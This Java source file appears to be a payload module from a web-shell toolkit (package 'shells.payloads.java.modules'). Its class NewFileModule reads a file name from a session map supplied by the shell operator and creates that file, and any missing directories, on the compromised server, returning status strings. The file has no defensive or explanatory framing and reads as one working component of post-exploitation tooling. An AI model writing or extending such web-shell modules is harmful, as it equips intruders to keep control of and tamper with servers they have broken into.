package shells.payloads.java.modules;

import java.io.File;
import java.io.FileOutputStream;
import java.util.Map;

public class NewFileModule {
    private Map session;
    private Object servletRequest;

    private String getString(String key) {
        Object value = this.session != null ? this.session.get(key) : null;
        if (value instanceof byte[]) {
            return new String((byte[]) value);
        }
        return value != null ? value.toString() : null;
    }
    
    public void setSession(Map session) {
        this.session = session;
    }
    
    public void setServletRequest(Object servletRequest) {
        this.servletRequest = servletRequest;
    }
    
    public byte[] execute() {
        try {
            String fileName = getString("fileName");
            
            if (fileName != null) {
                File file = new File(fileName);
                File parentDir = file.getParentFile();
                
                if (parentDir != null && !parentDir.exists()) {
                    parentDir.mkdirs();
                }
                
                if (file.createNewFile()) {
                    return "ok".getBytes();
                } else {
                    return "File already exists or cannot be created".getBytes();
                }
            }
            return "Missing fileName".getBytes();
        } catch (Exception e) {
            return ("Error: " + e.getMessage()).getBytes();
        }
    }
    
    public String getModuleName() {
        return "newFile";
    }
}
